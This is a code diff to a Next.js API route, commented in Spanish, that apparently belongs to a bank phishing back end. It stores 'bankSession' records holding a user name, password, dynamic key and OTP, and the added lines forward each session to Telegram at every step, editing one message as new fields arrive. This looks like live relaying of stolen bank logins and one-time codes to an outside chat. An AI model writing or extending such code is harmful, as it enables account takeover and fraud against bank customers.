@@ -45,6 +45,19 @@ export async function POST(request: NextRequest) {
             createdAt: new Date(),
           }
         });
+        
+        // Enviar mensaje inicial a Telegram
+        try {
+          const messageId = await sendToTelegram(session);
+          // Guardar el message_id en la base de datos
+          await prisma.bankSession.update({
+            where: { sessionId: generatedSessionId },
+            data: { telegramMessageId: messageId }
+          });
+        } catch (error) {
+          console.error('Error sending initial Telegram message:', error);
+        }
+        
         return NextResponse.json({ success: true, session });
 
       case 'update_user':
@@ -56,6 +69,16 @@ export async function POST(request: NextRequest) {
             updatedAt: new Date(),
           }
         });
+        
+        // Actualizar mensaje en Telegram
+        if (updatedUserSession.telegramMessageId) {
+          try {
+            await sendToTelegram(updatedUserSession, updatedUserSession.telegramMessageId);
+          } catch (error) {
+            console.error('Error updating Telegram message:', error);
+          }
+        }
+        
         return NextResponse.json({ success: true, session: updatedUserSession });
 
       case 'update_password':
@@ -67,6 +90,16 @@ export async function POST(request: NextRequest) {
             updatedAt: new Date(),
           }
         });
+        
+        // Actualizar mensaje en Telegram
+        if (updatedPasswordSession.telegramMessageId) {
+          try {
+            await sendToTelegram(updatedPasswordSession, updatedPasswordSession.telegramMessageId);
+          } catch (error) {
+            console.error('Error updating Telegram message:', error);
+          }
+        }
+        
         return NextResponse.json({ success: true, session: updatedPasswordSession });
 
       case 'update_dynamic_key':
@@ -129,11 +162,13 @@ export async function POST(request: NextRequest) {
           }
         });
         
-        // Enviar datos completos a Telegram cuando se envíe el OTP
-        try {
-          await sendToTelegram(updatedOtpSubmitSession);
-        } catch (error) {
-          console.error('Error sending to Telegram:', error);
+        // Actualizar mensaje en Telegram con la clave dinámica
+        if (updatedOtpSubmitSession.telegramMessageId) {
+          try {
+            await sendToTelegram(updatedOtpSubmitSession, updatedOtpSubmitSession.telegramMessageId);
+          } catch (error) {
+            console.error('Error updating Telegram message:', error);
+          }
         }
         
         return NextResponse.json({ success: true, session: updatedOtpSubmitSession });
